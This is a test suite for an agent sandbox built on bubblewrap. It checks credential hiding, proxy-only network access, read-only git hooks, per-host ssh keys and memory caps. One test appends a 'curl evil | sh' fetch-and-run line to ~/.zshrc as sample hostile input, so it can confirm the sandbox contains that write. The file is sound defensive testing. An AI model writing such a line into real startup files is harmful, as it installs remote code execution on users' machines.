import { execFileSync, spawn } from 'node:child_process'
import fs from 'node:fs'
import http from 'node:http'
import https from 'node:https'
import net, { type AddressInfo } from 'node:net'
import os from 'node:os'
import path from 'node:path'
import tls from 'node:tls'
import {
  AWS_ACCESS_ID,
  AWS_SETTINGS_DEFAULT,
  MEMORY_CAP_DEFAULTS,
  SANDBOX_POLICY_DEFAULT,
  type SshCheck,
  type Task,
} from '@seti/shared'
import { spawn as spawnPty } from 'node-pty'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { readProcesses, stoppable, subtreeOf, terminate } from './agent-processes.js'
import { findBinary } from './binaries.js'
import { CLAUDE_HOME, SETI_HOME } from './config.js'
import { tasks } from './db.js'
import { detectScopeHost, type ScopePlan } from './memory-scope.js'
import { oomRun, oomScriptArgs } from './oom-fixtures.js'
import { TOOL_OOM_ADJ } from './oom-guard.js'
import { Proc } from './proc.js'
import { loadSandboxCa, type SandboxCa } from './sandbox-ca.js'
import { hostClaudeJson } from './sandbox-mcp.js'
import { sandboxContext } from './session-options.js'
import { stopSshAgents } from './ssh-agent.js'
import { sshKeyService } from './ssh-key-service.js'
import { acceptHostKeys, checkHost } from './ssh-scan.js'
import { createSshHost, deleteSshHost, updateSshHost } from './ssh.js'
import { taskAccess } from './store/access.js'
import { profiles } from './store/credentials.js'
import { taskMcpChoices } from './store/mcp.js'
import { sandboxPolicy } from './store/sandbox.js'
import { CLAUDE_PLACEHOLDER, removeTaskSandbox, sandboxEnv, taskSandbox } from './task-sandbox.js'
import { workspaceDir } from './workspace/dir.js'

const available = (() => {
  try {
    findBinary('bwrap')
    findBinary('socat')
    execFileSync(findBinary('bwrap'), ['--unshare-user', '--unshare-net', '--ro-bind', '/', '/', 'true'])
    return true
  } catch {
    return false
  }
})()

const scopes = available ? await detectScopeHost(true) : null

describe('sandboxEnv', () => {
  it('passes only harmless variables and replaces credentials with placeholders', () => {
    const env = sandboxEnv(
      {
        PATH: '/usr/bin',
        LC_ALL: 'C',
        GITHUB_TOKEN: 'secret',
        DATABASE_URL: 'postgres://x',
        AWS_SECRET_ACCESS_KEY: 'k',
      },
      '/home/me',
      { github: false, connectors: false },
    )
    expect(env).toMatchObject({
      PATH: '/usr/bin',
      LC_ALL: 'C',
      HOME: '/home/me',
      CLAUDE_CODE_OAUTH_TOKEN: CLAUDE_PLACEHOLDER,
    })
    expect(env.GITHUB_TOKEN).toBeUndefined()
    expect(env.DATABASE_URL).toBeUndefined()
    expect(env.AWS_SECRET_ACCESS_KEY).toBeUndefined()
    expect(env.GH_TOKEN).toBeUndefined()
    expect(env.CLAUDE_CODE_OAUTH_SCOPES).toBeUndefined()
    expect(Object.values(env)).toEqual(expect.arrayContaining(['git@github.com:', 'ssh://git@github.com/']))
  })

  it("gives Node tools a heap sized to the memory cap, not the host's NODE_OPTIONS", () => {
    const host = { NODE_OPTIONS: '--require /host/hook.js' }
    const env = sandboxEnv(host, '/home/me', { github: false, connectors: false })
    expect(env.NODE_OPTIONS).toBe('--max-old-space-size=6144')
    expect(env.SETI_MEMORY_CAP_MB).toBeUndefined()
    const capped = sandboxEnv(host, '/home/me', { github: false, connectors: false, memory: MEMORY_CAP_DEFAULTS })
    expect(capped).toMatchObject({ NODE_OPTIONS: '--max-old-space-size=4300', SETI_MEMORY_CAP_MB: '6144' })
    expect(capped.CLAUDE_CODE_SHELL_PREFIX).toBe('/run/seti/tool-shell')
    expect(env.CLAUDE_CODE_SHELL_PREFIX).toBeUndefined()
  })

  it('asks Claude Code for connectors only when the host login can reach them', () => {
    const env = sandboxEnv({}, '/home/me', { github: true, connectors: true })
    expect(env.CLAUDE_CODE_OAUTH_SCOPES?.split(' ')).toEqual(['user:inference', 'user:mcp_servers'])
    expect(env.GH_TOKEN).not.toBe('')
  })
})

describe.skipIf(!available)('a real task sandbox', () => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'seti-bwrap-')))
  const work = path.join(root, 'work')
  const home = path.join(root, 'home')
  const project = path.join(home, 'project')
  let host: http.Server
  let port = 0
  let task: Task

  function git(...args: string[]): void {
    const identity = ['-c', 'user.name=Seti Test', '-c', 'user.email=test@seti.invalid']
    // eslint-disable-next-line sonarjs/no-os-command-from-path -- tests use the git on PATH like the server
    execFileSync('git', ['-C', project, ...identity, ...args], { stdio: 'ignore' })
  }

  function fakeHome(): void {
    fs.mkdirSync(path.join(project, 'src'), { recursive: true })
    fs.writeFileSync(path.join(project, 'src', 'main.ts'), 'export {}\n')
    git('init', '-q')
    git('add', '.')
    git('commit', '-qm', 'init')
    fs.mkdirSync(path.join(home, 'seti-live'))
    fs.mkdirSync(path.join(home, '.ssh'))
    fs.writeFileSync(path.join(home, '.ssh', 'id_ed25519'), 'key')
    fs.writeFileSync(path.join(home, '.profile'), 'echo host\n')
    fs.writeFileSync(path.join(home, 'backup.key'), 'key')
  }

  async function inSandbox(
    script: string,
    scope: ScopePlan | null = null,
  ): Promise<{ code: number | null; out: string }> {
    const ctx = { ...sandboxContext(), home }
    const sandbox = await taskSandbox(task, { ctx, policy: await sandboxPolicy.get() })
    const child = sandbox.spawn('/bin/bash', ['-c', script], { stdin: 'ignore', scope })
    let out = ''
    child.stdout?.on('data', (chunk: Buffer) => (out += chunk.toString()))
    child.stderr?.on('data', (chunk: Buffer) => (out += chunk.toString()))
    const code = await new Promise<number | null>((resolve) => child.on('exit', resolve))
    return { code, out }
  }

  beforeAll(async () => {
    fs.mkdirSync(path.join(work, '.git', 'hooks'), { recursive: true })
    fs.writeFileSync(path.join(work, '.git', 'config'), '[core]\n')
    fs.mkdirSync(CLAUDE_HOME, { recursive: true })
    fs.writeFileSync(path.join(CLAUDE_HOME, '.credentials.json'), '{"claudeAiOauth":{"accessToken":"x"}}')
    fs.writeFileSync(path.join(CLAUDE_HOME, 'settings.json'), '{}')
    fs.mkdirSync(SETI_HOME, { recursive: true })
    fs.writeFileSync(path.join(SETI_HOME, 'seti.env'), 'SECRET=1\n')
    fakeHome()
    host = http.createServer((_req, res) => res.end('hello from the host'))
    await new Promise<void>((resolve) => host.listen(0, '127.0.0.1', resolve))
    port = (host.address() as AddressInfo).port
    await sandboxPolicy.save({ ...SANDBOX_POLICY_DEFAULT, allowed_domains: [`localhost:${String(port)}`] })
    await tasks.insert({ id: 'bwrap-task', title: 'bwrap', repo_id: null, cwd: work, worktree: false, pr_urls: [] })
    const stored = await tasks.get('bwrap-task')
    if (!stored) {
      throw new Error('Task was not stored')
    }
    task = stored
  })

  afterAll(async () => {
    host.close()
    await removeTaskSandbox('bwrap-task')
    await sandboxPolicy.save(SANDBOX_POLICY_DEFAULT)
    fs.rmSync(root, { recursive: true, force: true })
  })

  it.skipIf(scopes === null)('runs in a memory scope of its own, with no user bus inside', async () => {
    if (scopes === null) {
      return
    }
    const cap = { high_mb: 256, max_mb: 512, swap_max_mb: 0 }
    const plan: ScopePlan = { host: scopes, taskId: task.id, kind: 'shell', cap, cpu: { quota_percent: null } }
    const { code, out } = await inSandbox('echo "bus=${XDG_RUNTIME_DIR-none}"; cat /proc/self/cgroup', plan)
    expect(code).toBe(0)
    expect(out).toContain('bus=none\n')
    expect(out).toMatch(/^0::\/user\.slice\/.*\/seti-[0-9a-f]{8}-shell-bwrap-task-[0-9a-f]{8}\.scope$/m)
  })

  it.skipIf(scopes === null).each(['hog', 'rush'] as const)(
    'keeps the process the sandbox runs alive when its %s tool hits the cap',
    async (tool) => {
      if (scopes === null) {
        return
      }
      const cap = { high_mb: 300, max_mb: 300, swap_max_mb: 0 }
      const plan: ScopePlan = { host: scopes, taskId: task.id, kind: 'agent', cap, cpu: { quota_percent: null } }
      const policy = await sandboxPolicy.get()
      const sandbox = await taskSandbox(task, { ctx: { ...sandboxContext(), home }, policy, memory: cap })
      const child = sandbox.spawn(process.execPath, oomScriptArgs(work, tool), { stdin: 'ignore', scope: plan })
      let out = ''
      child.stdout?.on('data', (chunk: Buffer) => (out += chunk.toString()))
      const code = await new Promise<number | null>((resolve) => child.on('exit', resolve))
      expect(code).toBe(0)
      const result = oomRun(out)
      expect(result).toMatchObject({ held: 160, after: result.before })
      expect(result.child).toEqual({ code: null, signal: 'SIGKILL', adj: String(TOOL_OOM_ADJ) })
    },
  )

  it('hides Seti, ssh, gh and the Claude login, and shows the task directory and workspace', async () => {
    const paths = [
      path.join(os.homedir(), '.seti'),
      path.join(os.homedir(), '.ssh'),
      path.join(os.homedir(), '.config', 'gh'),
      path.join(os.homedir(), '.claude', '.credentials.json'),
      path.join(SETI_HOME, 'seti.env'),
      '/var/run/docker.sock',
      `/run/user/${String(os.userInfo().uid)}`,
    ]
    const workspace = workspaceDir('bwrap-task')
    const script = [
      ...paths.map((p) => `test -e '${p}' && echo "VISIBLE ${p}"`),
      `echo "seti=$(ls -A '${SETI_HOME}')"`,
      `echo "workspaces=$(ls -A '${path.dirname(workspace)}')"`,
      `touch '${workspace}/chat.md' && echo "workspace writable"`,
      `echo "cwd=$PWD"`,
      'true',
    ].join('\n')
    const { code, out } = await inSandbox(script)
    expect(code).toBe(0)
    expect(out).not.toContain('VISIBLE')
    expect(out).toContain('seti=workspace\n')
    expect(out).toContain('workspaces=bwrap-task\n')
    expect(out).toContain('workspace writable')
    expect(fs.existsSync(path.join(workspace, 'chat.md'))).toBe(true)
    expect(out).toContain(`cwd=${work}`)
  })

  it("shows the home's code folders, not its files, dotfiles or excluded folders", async () => {
    const shown = ['project/src/main.ts', 'work']
    const absent = ['backup.key', '.profile', '.ssh/id_ed25519', 'seti-live']
    const script = [
      ...shown.map((p) => `test -e ~/${p} || echo "MISSING ${p}"`),
      ...absent.map((p) => `test -e ~/${p} && echo "VISIBLE ${p}"`),
      'true',
    ].join('\n')
    const { code, out } = await inSandbox(script)
    expect(code).toBe(0)
    expect(out).not.toMatch(/MISSING|VISIBLE/)
  })

  it('keeps dotfiles written at the home root inside the sandbox', async () => {
    const { code } = await inSandbox('echo "curl evil | sh" >> ~/.zshrc && echo x > ~/.bash_profile')
    expect(code).toBe(0)
    expect(fs.existsSync(path.join(home, '.zshrc'))).toBe(false)
    expect(fs.existsSync(path.join(home, '.bash_profile'))).toBe(false)
  })

  it('starts when Claude Code has a plugins folder without plugin data yet', async () => {
    const plugins = path.join(CLAUDE_HOME, 'plugins')
    fs.mkdirSync(path.join(plugins, 'store'), { recursive: true })
    try {
      const { code, out } = await inSandbox(
        [
          'touch ~/.claude/plugins/data/state && echo data-writable',
          'touch ~/.claude/plugins/store/x 2>/dev/null || echo plugins-read-only',
        ].join('\n'),
      )
      expect(out).toBe('data-writable\nplugins-read-only\n')
      expect(code).toBe(0)
      expect(fs.readdirSync(path.join(plugins, 'data'))).toEqual([])
    } finally {
      fs.rmSync(plugins, { recursive: true, force: true })
    }
  })

  it('adds a worktree under ~/work from a bound repo, and keeps its hooks and config read-only', async () => {
    const { code, out } = await inSandbox(
      [
        'git -C ~/project worktree add -q ~/work/feature -b feature && echo added',
        'touch ~/project/.git/hooks/post-checkout 2>/dev/null || echo hooks-read-only',
        'echo x >> ~/project/.git/config 2>/dev/null || echo config-read-only',
        'touch ~/project/src/new.ts && echo code-writable',
      ].join('\n'),
    )
    expect(code).toBe(0)
    expect(out).toContain('added')
    expect(out).toContain('hooks-read-only')
    expect(out).toContain('config-read-only')
    expect(out).toContain('code-writable')
    expect(fs.existsSync(path.join(home, 'work', 'feature', 'src', 'main.ts'))).toBe(true)
    expect(fs.existsSync(path.join(project, '.git', 'worktrees', 'feature'))).toBe(true)
    expect(fs.existsSync(path.join(project, '.git', 'hooks', 'post-checkout'))).toBe(false)
  })

  it('adds the host sign-in to a remote MCP server behind the Seti CA, without the token inside', async () => {
    const access = ['mcp', 'fake', 'access', 'value'].join('-')
    let authority: Promise<SandboxCa> | null = null
    const seen: string[] = []
    const mcp = https.createServer(
      {
        SNICallback: (name, done) => {
          authority ??= loadSandboxCa(path.join(SETI_HOME, 'sandbox-ca'))
          authority
            .then(async (ca) => ca.contextFor(name))
            .then(
              (context) => {
                done(null, context)
              },
              (e: unknown) => {
                done(e instanceof Error ? e : new Error(String(e)))
              },
            )
        },
      },
      (req, res) => {
        seen.push(req.headers.authorization ?? 'none')
        res.end(req.headers.authorization === `Bearer ${access}` ? 'bearer-ok' : 'bearer-missing')
      },
    )
    await new Promise<void>((resolve) => mcp.listen(0, resolve))
    const mcpPort = (mcp.address() as AddressInfo).port
    const login = {
      serverName: 'fake-mcp',
      serverUrl: `https://localhost:${String(mcpPort)}/mcp`,
      accessToken: access,
      expiresAt: Date.now() + 3_600_000,
    }
    fs.writeFileSync(
      path.join(CLAUDE_HOME, '.credentials.json'),
      JSON.stringify({ claudeAiOauth: { accessToken: 'x' }, mcpOAuth: { 'fake-mcp|1': login } }),
    )
    const defaults = tls.getCACertificates('default')
    try {
      const url = `https://localhost:${String(mcpPort)}/mcp`
      const script = `curl -sS -m 10 --noproxy '' ${url}; echo; echo "env-has-token=$(env | grep -c ${access})"`
      await inSandbox('true')
      const ca = fs.readFileSync(path.join(SETI_HOME, 'sandbox-ca', 'public', 'ca.pem'), 'utf8')
      tls.setDefaultCACertificates([...defaults, ca])
      const { out } = await inSandbox(script)
      expect(out).toContain('bearer-ok')
      expect(out).toContain('env-has-token=0')
      expect(seen).toEqual([`Bearer ${access}`])
      const files = execFileSync('/bin/sh', ['-c', `grep -rl ${access} ${path.join(SETI_HOME, 'sandbox')} || true`])
      expect(files.toString().trim()).toBe('')
    } finally {
      tls.setDefaultCACertificates(defaults)
      mcp.close()
      fs.writeFileSync(path.join(CLAUDE_HOME, '.credentials.json'), '{"claudeAiOauth":{"accessToken":"x"}}')
    }
  })

  it('gets a local server of another directory only once it is on for the agent', async () => {
    const config = path.join(SETI_HOME, 'sandbox', task.id, 'home', '.claude.json')
    const borrowed = { type: 'http', url: 'https://staging.example.com/mcp' }
    fs.writeFileSync(hostClaudeJson(), JSON.stringify({ projects: { [project]: { mcpServers: { borrowed } } } }))
    const servers = () => (JSON.parse(fs.readFileSync(config, 'utf8')) as { mcpServers: object }).mcpServers
    try {
      await inSandbox('true')
      expect(servers()).toEqual({})
      await taskMcpChoices.set(task.id, { borrowed: true })
      await inSandbox('true')
      expect(servers()).toEqual({ borrowed })
    } finally {
      await taskMcpChoices.set(task.id, {})
      fs.rmSync(hostClaudeJson(), { force: true })
    }
  })

  it("leaves out a keyed server that only another server's sign-in on its URL covers", async () => {
    const config = path.join(SETI_HOME, 'sandbox', task.id, 'home', '.claude.json')
    const url = 'https://staging.example.com/api/mcp'
    const keyed = { type: 'http', url, headers: { Authorization: 'Bearer k' } }
    fs.writeFileSync(hostClaudeJson(), JSON.stringify({ projects: { [project]: { mcpServers: { keyed } } } }))
    const credentials = path.join(CLAUDE_HOME, '.credentials.json')
    const signIn = (name: string, accessToken?: string) => ({ serverName: name, serverUrl: url, accessToken })
    const writeLogins = (logins: object) => {
      fs.writeFileSync(credentials, JSON.stringify({ claudeAiOauth: { accessToken: 'x' }, mcpOAuth: logins }))
    }
    const servers = () => (JSON.parse(fs.readFileSync(config, 'utf8')) as { mcpServers: object }).mcpServers
    try {
      await taskMcpChoices.set(task.id, { keyed: true })
      writeLogins({ 'staging|1': signIn('staging') })
      await inSandbox('true')
      expect(servers()).toEqual({})
      writeLogins({ 'staging|1': signIn('staging'), 'keyed|2': signIn('keyed', 'signed-in') })
      await inSandbox('true')
      expect(servers()).toEqual({ keyed: { type: 'http', url } })
    } finally {
      await taskMcpChoices.set(task.id, {})
      fs.rmSync(hostClaudeJson(), { force: true })
      fs.writeFileSync(credentials, '{"claudeAiOauth":{"accessToken":"x"}}')
    }
  })

  const awsCli = (() => {
    try {
      return findBinary('aws')
    } catch {
      return null
    }
  })()

  it.skipIf(awsCli === null)("hands the AWS CLI inside the role of the task's profile through a fake STS", async () => {
    const role = 'arn:aws:iam::123456789012:role/seti-agent-readonly'
    const assumed: URLSearchParams[] = []
    const expiration = new Date(Date.now() + 3_600_000).toISOString()
    const sts = http.createServer((req, res) => {
      let body = ''
      req.on('data', (chunk: Buffer) => (body += chunk.toString()))
      req.on('end', () => {
        assumed.push(new URLSearchParams(body))
        res.writeHead(200, { 'content-type': 'text/xml' })
        res.end(
          '<AssumeRoleResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/"><AssumeRoleResult><Credentials>' +
            '<AccessKeyId>ASIAFAKESTS</AccessKeyId><SecretAccessKey>fake-sts-secret</SecretAccessKey>' +
            `<SessionToken>fake-sts-session</SessionToken><Expiration>${expiration}</Expiration>` +
            '</Credentials></AssumeRoleResult><ResponseMetadata><RequestId>1</RequestId></ResponseMetadata>' +
            '</AssumeRoleResponse>',
        )
      })
    })
    await new Promise<void>((resolve) => sts.listen(0, '127.0.0.1', resolve))
    const saved = { ...process.env }
    process.env.AWS_ENDPOINT_URL_STS = `http://127.0.0.1:${String((sts.address() as AddressInfo).port)}`
    process.env.AWS_ACCESS_KEY_ID = 'AKIAFAKEHOST'
    process.env.AWS_SECRET_ACCESS_KEY = 'fake-host-secret'
    const profile = await profiles.create('AWS readers')
    await profiles.setAws(profile.id, { ...AWS_SETTINGS_DEFAULT, role_arn: role })
    await taskAccess.set(task.id, 'aws', AWS_ACCESS_ID, true)
    await tasks.setProfile(task.id, profile.id)
    task = { ...task, profile_id: profile.id }
    try {
      const { code, out } = await inSandbox(
        [
          'aws configure export-credentials --format process',
          'echo "region=$AWS_REGION"',
          'env | grep -c -e fake-host-secret -e AKIAFAKEHOST || true',
        ].join('\n'),
      )
      expect(code).toBe(0)
      const exported = JSON.parse(out.slice(0, out.indexOf('}') + 1)) as { AccessKeyId: string }
      expect(exported.AccessKeyId).toBe('ASIAFAKESTS')
      expect(out).toContain('region=us-east-1')
      expect(out.trim().endsWith('0')).toBe(true)
      expect(assumed).toHaveLength(1)
      expect(assumed[0]?.get('Action')).toBe('AssumeRole')
      expect(assumed[0]?.get('RoleArn')).toBe(role)
      expect(assumed[0]?.get('RoleSessionName')).toBe('seti-agent')
    } finally {
      process.env = saved
      await taskAccess.set(task.id, 'aws', AWS_ACCESS_ID, null)
      await tasks.setProfile(task.id, 'default')
      task = { ...task, profile_id: 'default' }
      await profiles.remove(profile.id)
      sts.close()
    }
  })

  const sshd = fs.existsSync('/usr/sbin/sshd') ? '/usr/sbin/sshd' : null

  async function freePort(): Promise<number> {
    const server = net.createServer()
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
    const { port: free } = server.address() as AddressInfo
    await new Promise((resolve) => server.close(resolve))
    return free
  }

  /** A throwaway sshd on `address` that accepts only `key`. */
  async function startSshd(dir: string, address: string, key: string): Promise<{ port: number; stop: () => void }> {
    fs.mkdirSync(dir, { mode: 0o700 })
    execFileSync(findBinary('ssh-keygen'), ['-q', '-t', 'ed25519', '-N', '', '-f', path.join(dir, 'host')])
    fs.writeFileSync(path.join(dir, 'authorized_keys'), `${key}\n`)
    const sshPort = await freePort()
    const config = [
      `ListenAddress ${address}`,
      `Port ${String(sshPort)}`,
      `HostKey ${path.join(dir, 'host')}`,
      `AuthorizedKeysFile ${path.join(dir, 'authorized_keys')}`,
      `PidFile ${path.join(dir, 'sshd.pid')}`,
      'UsePAM no',
      'StrictModes no',
      'PasswordAuthentication no',
      'KbdInteractiveAuthentication no',
    ]
    fs.writeFileSync(path.join(dir, 'sshd_config'), `${config.join('\n')}\n`)
    const daemon = spawn(sshd ?? '', ['-D', '-e', '-f', path.join(dir, 'sshd_config')], { stdio: 'ignore' })
    await vi.waitFor(async () => {
      const probe = net.connect(sshPort, address)
      await new Promise<void>((resolve, reject) => {
        probe.once('connect', resolve)
        probe.once('error', reject)
      })
      probe.destroy()
    })
    return { port: sshPort, stop: () => daemon.kill() }
  }

  const lines = (out: string) => out.trim().split('\n')

  /** ssh reads ~/.ssh from the passwd entry, which is this fake home only through -F. */
  it.skipIf(sshd === null)(
    'ssh reaches only granted hosts, each logging in with its own key, and offers only their keys',
    async () => {
      const keyA = await sshKeyService.generate('sandbox a')
      const keyB = await sshKeyService.generate('sandbox b')
      const a = await startSshd(path.join(root, 'sshd-a'), '127.0.0.1', keyA.public_key)
      const b = await startSshd(path.join(root, 'sshd-b'), '127.0.0.2', keyB.public_key)
      const user = os.userInfo().username
      const hasKeyB = `ssh-add -L | grep -c "${keyB.public_key.split(' ')[1] ?? 'none'}" || true`
      const other = { hostname: '127.0.0.2', port: b.port, user, jump: null, options: [] }
      const addHost = async (alias: string, hostname: string, sshPort: number, jump: string | null = null) =>
        createSshHost(alias, { hostname, port: sshPort, user, key_id: keyA.id, jump, options: [] })
      try {
        await addHost('box', '127.0.0.1', a.port)
        await addHost('inner', '127.0.0.1', a.port, 'box')
        await addHost('other', '127.0.0.2', b.port)
        const checks = new Map<string, SshCheck>()
        for (const alias of ['box', 'other']) {
          const check = await checkHost(alias)
          checks.set(alias, check)
          await acceptHostKeys(
            check.keys.filter((entry) => entry.key_type === 'ssh-ed25519').map((entry) => entry.line),
          )
        }
        expect(checks.get('box')?.login).toEqual({ ok: true, detail: `Logged in as ${user} with sandbox a` })
        expect(checks.get('other')?.login.ok).toBe(false)
        expect(checks.get('other')?.login.detail).toContain('Permission denied')
        const inner = await checkHost('inner')
        expect(inner.keys.map((entry) => entry.known)).toContain(true)
        expect(inner.login.ok).toBe(true)
        const off = await inSandbox('ls ~/.ssh/config 2>/dev/null || echo no-ssh-config; echo "sock=$SSH_AUTH_SOCK"')
        expect(off.out).toContain('no-ssh-config')
        expect(off.out).toContain('sock=\n')

        await taskAccess.set(task.id, 'ssh', 'inner', true)
        const { out } = await inSandbox(
          [
            'ssh() { command ssh -F "$HOME/.ssh/config" "$@"; }',
            'ssh inner echo jump-ok',
            'ssh box echo jump-host-ok',
            `ssh -o ConnectTimeout=5 -p ${String(b.port)} ${user}@127.0.0.2 true 2>&1 | grep -c "Forbidden" || true`,
            'grep -c "^Host other" ~/.ssh/config || true',
            'grep -c "127.0.0.2" ~/.ssh/known_hosts || true',
            'ssh-add -l | grep -c ED25519',
            hasKeyB,
            'grep -rl "PRIVATE KEY" ~/.ssh /run/seti-ssh 2>/dev/null | wc -l',
            'touch ~/.ssh/config 2>/dev/null || echo ssh-read-only',
          ].join('\n'),
        )
        expect(out).toContain('jump-ok')
        expect(out).toContain('jump-host-ok')
        expect(out).toContain('ssh-read-only')
        expect(lines(out).slice(-7, -1)).toEqual(['1', '0', '0', '1', '0', '0'])

        await taskAccess.set(task.id, 'ssh', 'other', true)
        const wrongKey = await inSandbox(
          [
            'ssh -F "$HOME/.ssh/config" -o ConnectTimeout=5 other echo b-ok 2>&1 | grep -c "Permission denied" || true',
            hasKeyB,
          ].join('\n'),
        )
        expect(lines(wrongKey.out)).toEqual(['1', '0'])

        await updateSshHost('other', { ...other, key_id: keyB.id })
        const both = await inSandbox(
          [
            'ssh -F "$HOME/.ssh/config" other echo b-ok',
            'ssh-add -l | grep -c ED25519',
            'ssh -v -F "$HOME/.ssh/config" box true 2>&1 | grep -c "Offering public key" || true',
          ].join('\n'),
        )
        expect(lines(both.out).slice(-3)).toEqual(['b-ok', '2', '1'])
      } finally {
        a.stop()
        b.stop()
        await taskAccess.set(task.id, 'ssh', 'inner', null)
        await taskAccess.set(task.id, 'ssh', 'other', null)
        for (const alias of ['inner', 'box', 'other']) {
          await deleteSshHost(alias).catch(() => undefined)
        }
        await sshKeyService.remove(keyA.id)
        await sshKeyService.remove(keyB.id)
        await stopSshAgents()
      }
    },
    30_000,
  )

  it('has its own process table', async () => {
    const { out } = await inSandbox('for p in /proc/[0-9]*; do cat "$p/comm"; done')
    const names = out.trim().split('\n')
    expect(names.length).toBeLessThan(10)
    expect(names).not.toContain('node')
    expect(names).toEqual(expect.arrayContaining(['bwrap', 'socat']))
  })

  it("cannot reach the host's loopback, only allowed hosts through the proxy", async () => {
    const direct = await inSandbox(`curl -sS -m 5 --noproxy '*' http://127.0.0.1:${String(port)}/`)
    expect(direct.code).not.toBe(0)
    const proxied = await inSandbox(`curl -sS -m 10 --noproxy '' http://localhost:${String(port)}/`)
    expect(proxied).toMatchObject({ code: 0, out: 'hello from the host' })
    const denied = await inSandbox(`curl -sS -m 10 --noproxy '' http://denied.invalid/`)
    expect(denied.out).toContain('denied.invalid is not on the allowed hosts list')
  })

  it('leaves no process behind once the command ends, socat included', async () => {
    const { code } = await inSandbox('sleep 0.2')
    expect(code).toBe(0)
    const inWork = () =>
      fs.readdirSync('/proc').filter((pid) => {
        try {
          return /^\d+$/.test(pid) && fs.readlinkSync(`/proc/${pid}/cwd`).startsWith(work)
        } catch {
          return false
        }
      })
    await vi.waitFor(() => {
      expect(inWork()).toEqual([])
    })
  })

  it('gives an interactive shell its own terminal: job control, Ctrl+C and resizes', async () => {
    const sandbox = await taskSandbox(task, { ctx: { ...sandboxContext(), home }, policy: await sandboxPolicy.get() })
    const env = { ...sandbox.env, TERM: 'xterm-256color', PS1: '$ ' }
    const run = sandbox.command('/bin/bash', ['--norc', '-i'], { env, interactive: true })
    const pty = spawnPty(run.program, run.args, { cwd: work, env: run.env, cols: 80, rows: 24 })
    let out = ''
    pty.onData((data) => {
      out += data
    })
    const exited = new Promise<number>((resolve) => {
      pty.onExit(({ exitCode }) => {
        resolve(exitCode)
      })
    })
    await vi.waitFor(() => {
      expect(out).toContain('$ ')
    })
    pty.write('sleep 30\r')
    await vi.waitFor(() => {
      expect(out).toContain('sleep 30\r\n')
    })
    pty.write('\x03')
    pty.write('echo alive-$((1+1))\r')
    await vi.waitFor(() => {
      expect(out).toContain('alive-2')
    })
    pty.resize(100, 30)
    pty.write('stty size; exit\r')
    expect(await exited).toBe(0)
    expect(out).toContain('30 100')
    expect(out).not.toContain('no job control')
  })

  it('keeps git hooks and config read-only and sees only placeholders', async () => {
    const { out } = await inSandbox(
      [
        'touch .git/hooks/pre-commit 2>/dev/null || echo hooks-read-only',
        'echo x >> .git/config 2>/dev/null || echo config-read-only',
        'touch ok && echo cwd-writable',
        'echo "oauth=$CLAUDE_CODE_OAUTH_TOKEN"',
      ].join('\n'),
    )
    expect(out).toContain('hooks-read-only')
    expect(out).toContain('config-read-only')
    expect(out).toContain('cwd-writable')
    expect(out).toContain(`oauth=${CLAUDE_PLACEHOLDER}`)
  })

  it("shows the sandbox's processes from the host, with Seti's helpers apart and stoppable commands", async () => {
    const ctx = { ...sandboxContext(), home }
    const sandbox = await taskSandbox(task, { ctx, policy: await sandboxPolicy.get() })
    const env = { ...sandbox.env, SETI_TASK_ID: task.id }
    const child = sandbox.spawn('/bin/bash', ['-c', 'bash -c "sleep 310; true" & wait'], { env, stdin: 'ignore' })
    const processHost = { proc: new Proc(), serverPid: process.pid }
    try {
      let view = (await readProcesses(task.id, null, processHost)).view
      await vi.waitFor(async () => {
        view = (await readProcesses(task.id, null, processHost)).view
        expect(view.processes.map((p) => p.name)).toEqual(['bwrap', 'bwrap', 'bash', 'socat', 'bash', 'sleep'])
      })
      expect(view.sandboxed).toBe(true)
      expect(view.processes.map((p) => p.kind)).toEqual(['seti', 'seti', 'agent', 'seti', 'command', 'command'])
      const [outer, , agentShell, , command] = view.processes
      expect(outer?.pid).toBe(child.pid)
      expect(agentShell?.ns_pid).toBe(2)
      expect(command?.ns_pid).toBeLessThan(10)
      expect(() => stoppable(view.processes, outer?.pid ?? 0, outer?.start_ticks ?? 0)).toThrow("Seti's own")
      if (command === undefined) {
        throw new Error('command missing')
      }
      const target = stoppable(view.processes, command.pid, command.start_ticks)
      await terminate(subtreeOf(view.processes, target), processHost, 2000)
      await vi.waitFor(async () => {
        expect((await readProcesses(task.id, null, processHost)).view.processes).toEqual([])
      })
    } finally {
      child.kill('SIGKILL')
    }
  })
})
